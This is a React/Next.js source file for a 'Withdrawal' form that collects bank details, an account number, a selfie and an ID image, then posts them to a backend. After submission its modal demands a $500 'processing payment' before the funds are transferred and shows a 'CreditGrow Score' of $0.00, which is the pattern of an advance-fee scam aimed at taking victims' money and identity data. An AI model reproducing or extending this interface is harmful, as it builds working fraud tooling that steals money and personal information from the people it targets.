'use client'
import Typewriter from '@/lib/typewriter/Typewriter';
import axios from 'axios';
import { useFormik } from 'formik'
import { useRouter } from 'next/navigation';
import React, {  useState } from 'react'
import { toast, Toaster } from 'sonner';
import * as Yup from 'yup';


const Withdrawal = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [loading, setLoading] = useState<boolean>(false)
  const [selfie, setSelfie] = useState<string | null>(null);
  const [file, setFile] = useState<string | null>(null);
  const router = useRouter()
  // Open Camera for Selfie
  const takeSelfie = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      const video = document.createElement("video");
      video.srcObject = stream;
      await new Promise((resolve) => (video.onloadedmetadata = resolve));

      // Capture Image
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d")?.drawImage(video, 0, 0, canvas.width, canvas.height);

      const dataUrl = canvas.toDataURL("image/png"); // Convert to Base64
      convertToBase16(dataUrl, setSelfie); // Convert to Base16
      stream.getTracks().forEach(track => track.stop()); // Stop camera
    } catch (error) {
      console.error("Error opening camera:", error);
    }
  };

  // Handle File Selection (Gallery)
  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (file) {
      convertToBase16(file, setFile);
    }
  };

  // Convert to Base16 (Hex)
  const convertToBase16 = (input: Blob | string, setFile: React.Dispatch<React.SetStateAction<string | null>>) => {
    if (typeof input === "string") {
      const base64 = input.split(",")[1];
      const binary = atob(base64);
      const hex = Array.from(binary).map((char) => char.charCodeAt(0).toString(16).padStart(2, "0")).join("");
      setFile(hex);
    } else {
      const reader = new FileReader();
      reader.onload = () => {
        if (reader.result instanceof ArrayBuffer) {
          const hex = [...new Uint8Array(reader.result)].map(byte => byte.toString(16).padStart(2, "0")).join("");
          setFile(hex);
        }
      };
      reader.readAsArrayBuffer(input);
    }
  };


  const formik = useFormik({
    initialValues: {
      bankName: '',
      accountName: '',
      accountNumber: '',
      amountToWithdraw: '',
      selfie: '',
      file: '',
    },
    validationSchema: Yup.object({
      bankName: Yup.string(),
      accountName: Yup.string(),
      accountNumber: Yup.number(),
      amountToWithdraw: Yup.number().min(5000, 'Amount must be at least $5000'),
      selfie: Yup.string(),
      file: Yup.string(),
    }),
    onSubmit: async (values) => {
      setLoading(true)
      try {
        const { data } = await axios.post(`${process.env.NEXT_PUBLIC_API_URL}/api/withdrawal`, values, {
          withCredentials: true,
        }
        )
        if (!(data?.success)) {
          return toast.error(data.msg)
        }
        if (data?.success) {
          setIsOpen(true)
        }
      } catch (error) {
        console.log(error)
      } finally {
        setLoading(false)
      }
    }
  })
  console.log(formik.values);

  return (
    <section className="h-full">
      <button
        onClick={() => setIsOpen(true)}
        className="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition"
      >
        Open Modal
      </button>
      {isOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 px-4">
          <div className="bg-white rounded-lg shadow-xl w-full max-w-md p-6 text-center relative">
            {/* Close Button */}
            <button
              onClick={() => setIsOpen(false)}
              className="absolute top-3 right-4 text-gray-500 hover:text-gray-700 text-2xl"
            >
              &times;
            </button>

            {/* Modal Content */}
            <div className="inline-flex items-center justify-center w-12 h-12 rounded-full">
              <svg
                viewBox="0 0 48 48"
                height="100"
                width="100"
                xmlns="http://www.w3.org/2000/svg"
              >
                <defs>
                  <linearGradient
                    gradientUnits="userSpaceOnUse"
                    y2="37.081"
                    y1="10.918"
                    x2="10.918"
                    x1="37.081"
                    id="SVGID_1__8tZkVc2cOjdg_gr1"
                  >
                    <stop stopColor="#60fea4" offset="0" />
                    <stop stopColor="#6afeaa" offset=".033" />
                    <stop stopColor="#97fec4" offset=".197" />
                    <stop stopColor="#bdffd9" offset=".362" />
                    <stop stopColor="#daffea" offset=".525" />
                    <stop stopColor="#eefff5" offset=".687" />
                    <stop stopColor="#fbfffd" offset=".846" />
                    <stop stopColor="#fff" offset="1" />
                  </linearGradient>
                </defs>

                <circle fill="url(#SVGID_1__8tZkVc2cOjdg_gr1)" r="18.5" cy="24" cx="24" />

                <path
                  d="M35.401,38.773C32.248,41.21,28.293,42.66,24,42.66C13.695,42.66,5.34,34.305,5.34,24	c0-2.648,0.551-5.167,1.546-7.448"
                  strokeWidth="3"
                  strokeMiterlimit="10"
                  strokeLinejoin="round"
                  strokeLinecap="round"
                  stroke="#10e36c"
                  fill="none"
                />

                <path
                  d="M12.077,9.646C15.31,6.957,19.466,5.34,24,5.34c10.305,0,18.66,8.354,18.66,18.66	c0,2.309-0.419,4.52-1.186,6.561"
                  strokeWidth="3"
                  strokeMiterlimit="10"
                  strokeLinejoin="round"
                  strokeLinecap="round"
                  stroke="#10e36c"
                  fill="none"
                />

                <polyline
                  points="16.5,23.5 21.5,28.5 32,18"
                  strokeWidth="3"
                  strokeMiterlimit="10"
                  strokeLinejoin="round"
                  strokeLinecap="round"
                  stroke="#10e36c"
                  fill="none"
                />
              </svg>
            </div>


            <h3 className="text-xl font-semibold mb-2">Withdrawal Request Received</h3>
            <p className="text-gray-700 text-sm mb-4">
              Your withdrawal request has been successfully submitted.
            </p>
            <p className="text-gray-700 text-sm mb-4">
              To complete the process, you&apos;ll need to make a small processing payment of $500. Once the payment is confirmed, we’ll transfer your funds directly to your bank account.
              <br />
              Your current CreditGrow Score is <span className="font-bold text-red-600">$0.00</span>. This score helps determine your eligibility and processing fees.
            </p>
            <p className="text-sm text-gray-600">
              Please follow the next steps to make your payment.
            </p>

            {/* Action Button */}
            <div className="mt-6">
              <button
                onClick={() => {
                  setIsOpen(false);
                  router.push('/dashboard/wallet')
                }}
                className="px-4 py-2 bg-green-600 text-white rounded hover:bg-green-700 transition"
              >
                Proceed to Payment
              </button>
            </div>
          </div>
        </div>

      )}
      <Toaster
        richColors
        position='top-right'
        duration={2000}
      />
      <form
        onSubmit={formik.handleSubmit}
        className="p-[1rem] md:p-[2rem] shadow-m bg-white border border-[#dadbdd] mt-[1rem] mb-[2rem]">
        <div className="flex flex-col md:flex-row  justify-between items-center gap-2 md:gap-5  mb-2">
          <div className="md:flex-1 w-full">
            <label htmlFor="" className="text-[#383839]">Bank Name</label>
            <input name="bankName" required type="text" className="text-[#383839] block outline-none w-full p-[7px] text-[14px]  border border-[#dadbdd] rounded-[5px] focus:border-blue-700" onChange={formik.handleChange} />
          </div>
          <div className="md:flex-1 w-full">
            <label htmlFor="">Account Name</label>
            <input name="accountName" required type="text" className="text-[#383839] block outline-none w-full p-[7px] text-[14px]  border border-[#dadbdd] rounded-[5px] focus:border-blue-700" onChange={formik.handleChange} />
          </div>
        </div>
        <div className="flex flex-col md:flex-row  justify-between items-center gap-2 md:gap-5  mb-2">
          <div className="md:flex-1 w-full">
            <label htmlFor="" className="text-[#383839]">Account Number</label>
            <input
              onChange={formik.handleChange}
              onBlur={formik.handleBlur}
              type="number"
              required
              name="accountNumber"
              className="text-[#383839] block outline-none w-full p-[7px] text-[14px]  border border-[#dadbdd] rounded-[5px] focus:border-blue-700"
            />
          </div>
          <div className="md:flex-1 w-full">
            <label htmlFor="" className="text-[#383839]">Amount to withdarw?</label>
            <input name="amountToWithdraw" required type="number" className="text-[#383839] block outline-none w-full p-[7px] text-[14px]  border border-[#dadbdd] rounded-[5px] focus:border-blue-700" onChange={formik.handleChange} onBlur={formik.handleBlur} />
            {formik.touched.amountToWithdraw && formik.errors.amountToWithdraw && (
              <label htmlFor="loanAmount" className="mt-1 text-red-600 text-[12px] md:text-[15px]">Amount must be at least $5000</label>
            )}
          </div>
        </div>

        <div className='mb-2 border p-2'>
          <p className=' text-center text-[1.1rem] my-1'>
            Means of Identification
          </p>
          <div className="flex flex-col md:flex-row justify-between items-center gap-2 md:gap-5">
            {/* Take Selfie */}
            <button
              type='button'
              onClick={takeSelfie}
              className="w-full md:flex-1 bg-blue-500 text-white p-2 rounded-md hover:bg-blue-600 text-center"
            >
              Take Selfie 📸
            </button>
            {selfie && <p className="text-sm text-green-500 mt-2">Selfie Taken!</p>}

            {/* Choose from Gallery */}
            <label className="w-full md:flex-1 bg-gray-200 text-black p-2 rounded-md hover:bg-gray-300 text-center cursor-pointer">
              Choose File (Gallery or Camera)
              <input
                type="file"
                accept="image/*"
                className="hidden"
                onChange={handleFileChange}
              />
            </label>
            {file && <p className="text-sm text-green-500 mt-2">File Selected!</p>}
          </div>
        </div>
        <div className=" text-center text-[1rem] text-white mt-4">
          <button className=" p-3 bg-gray-800 rounded-[5px] hover:bg-gray-600" type="submit" disabled={loading}>{loading ? <Typewriter text="Wait" /> : 'Withdraw'}</button>
        </div>
      </form>
    </section>

  )
}

export default Withdrawal;